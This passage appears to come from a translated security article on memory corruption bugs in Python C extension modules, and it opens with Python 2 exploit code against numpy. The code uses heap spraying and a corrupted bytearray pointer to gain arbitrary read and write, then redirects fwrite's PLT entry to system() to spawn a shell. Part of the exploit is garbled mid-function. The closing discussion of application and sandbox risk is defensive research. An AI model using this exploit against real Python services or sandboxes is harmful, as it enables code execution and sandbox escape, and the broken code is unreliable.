        addr_str = "%016x" % (addr)
        ret = str()
        for i in range(16, 0, -2):
            ret = ret + addr_str[i-2:i].decode('hex')
        return ret
    # read_address and write_address use overflown numpy arrays to search for
    # bytearray objects we've sprayed on the heap, represented as a PyByteArray
    # structure:
    # 
    # struct PyByteArray {
    #     Py_ssize_t ob_refcnt;
    #     struct _typeobject *ob_type;
    #     Py_ssize_t ob_size;
    #     int ob_exports;
    #     Py_ssize_t ob_alloc;
    #     char *ob_bytes;
    # };
    # 
    # Once located, the pointer to actual data `ob_bytes` is overwritten with the
    # address that we want to read or write. We then cycle through the list of byte
    # arrays until we find the  one that has been corrupted. This bytearray is used
    # to read or write the desired location. Finally, we clean up by setting
    # `ob_bytes` back to its original value.
    def find_address(addr, data=None):
        i = 0
        j = -1
        k = 0
        if data:
            size = 0x102
        else:
            size = 0x103
        for k, arr in enumerate(arrays):
            i = 0
            for i in range(0x2000): # 0x2000 is a value that happens to work
                # Here we search for the signature of a PyByteArray structure
                j = arr[0][i].find(addr_to_str(0x1))                  # ob_refcnt
                if (j ob_bytes
                            arrays[k][0][i] = saved_metadata
                            return ret
                    except:
                        pass
        raise Exception("Failed to find address %x" % addr)
    def read_address(addr):
        return find_address(addr)
    def write_address(addr, data):
        find_address(addr, data)
    # The address of GOT/PLT entries for system() and fwrite() are hardcoded. These
    # addresses are static for a given Python binary when compiled without -fPIE.
    # You can obtain them yourself with the following command:
    # `readelf -a /path/to/python/ | grep -E '(system|fwrite)'
    SYSTEM = 0x8eb278
    FWRITE = 0x8eb810
    # Spray the heap with some bytearrays and overflown numpy arrays.
    arrays = []
    bytearrays = []
    for i in range(100):
        arrays.append(np.array('A'*0x100))
        arrays[-1].resize(0x1000, 0x100000000000001)
        bytearrays.append(bytearray('X'*0x102))
        bytearrays.append(bytearray('X'*0x103))
    # Read the address of system() and write it to fwrite()'s PLT entry. 
    data = read_address(SYSTEM)
    write_address(FWRITE, data)
    # print() will now call system() with whatever string you pass
    print "PS1='[HACKED] $ ' /bin/sh"
运行漏洞利用给你一个“hacked”的shell。
如果您没有运行Python 2.7.12，请参阅漏洞利用中的注释，了解如何使其适用于您的Python版本
**量化风险**
众所周知，Python的核心和许多第三方模块都是C代码的包装。
也许不那么认识到，内存损坏错误在流行的Python模块中一直没有像CVE，安全公告，甚至提及发行说明中的安全修复一样被报告。
那么是的，Python模块中有很多内存损坏的bug。 当然不是所有的都是可以利用的，但你必须从某个地方开始。
为了解释内存损坏错误造成的风险，我发现使用两个不同的用例来构建对话：常规Python应用程序和沙盒不受信任的代码。
**Regular applications**
我们关心的应用程序类型是具有有意义的攻击面的那些。
考虑Web应用程序和其他面向网络的服务，处理不受信任内容，特权系统服务等的客户端应用程序。这些应用程序中的许多应用程序导入针对C代码的Python模块，而不是将其内存损坏错误视为安全问题的项目。
这个纯粹的想法可能会让一些安全专业人员在即使受到伤害，也实际上风险通常被忽视或忽视。 我怀疑有几个原因：
远程识别和利用内存损坏问题的难度相当高，特别是对于源代码和远程应用程序。
应用程序暴露不可信输入路径以达到易受攻击的功能的可能性可能相当低。
意识不足，因为Python模块中的内存损坏错误通常不会被视为安全问题。
如此公平地说，由于某些随机Python模块中的缓冲区溢出而导致入侵的可能性可能相当低。 但是，再一次，内存破坏的缺陷在发生时可能是非常有害的。
有时，甚至没有人明确地利用他们造成伤害。 更糟糕的是，当库维护者在安全性方面不考虑内存损坏问题时，保持库修补是非常不可能的。
如果您开发了一个主要的Python应用程序，建议您至少选择正在使用的Python模块的清单。
尝试找出您的模块依赖多少C代码，并分析本地代码暴露于应用程序边缘的潜力。
**沙盒**
有一些服务允许用户在沙箱内运行不受信任的Python代码。
操作系统级的沙盒功能，如linux命名空间和seccomp，最近才以Docker，LXC等形式流行。今天仍然可以使用较弱的沙盒技术 –
在chroot形式的OS层监狱或更糟糕的是，沙盒可以完全在Python中完成（请参阅[pypy-sandbox](http://doc.pypy.org/en/latest/sandbox.html)和[pysandbox](https://github.com/haypo/pysandbox)
）。
内存损坏错误完全打破了OS不执行的沙盒。 执行Python代码子集的能力使得开发远比常规应用程序更可行。
即使是由于其虚拟化系统调用的二进程模型而声称安全的Pypy-sandbox也可能被缓冲区溢出所破坏。
如果您想运行任何类型的不受信任的代码，请投入努力建立一个安全的操作系统和网络架构来沙箱。